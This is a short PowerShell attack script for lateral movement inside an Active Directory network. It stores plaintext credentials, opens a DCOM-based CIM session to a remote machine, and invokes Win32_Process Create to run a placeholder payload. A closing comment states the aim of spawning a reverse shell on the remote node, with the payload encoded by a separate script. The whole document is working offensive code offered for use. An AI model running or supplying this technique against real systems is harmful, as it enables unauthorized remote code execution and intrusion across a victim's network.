#This script requires a Local Administrator user and a Domain user to be used succesfully. It uses the New-Cimsession powershell's cmdlet in the $session var in order to spawn a new process in a remote target within an AD network.



#Creds store part.
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

#Command Object part.
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <ip> -Credential $credential -SessionOption $Options 
$command = '<payload>';

#Invoking Create method.
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

#In theory, we must use this script to move along to a remote 'node' and spawn there a reverse shell which will be pass to the script encoded with the 'encoder.py' script.
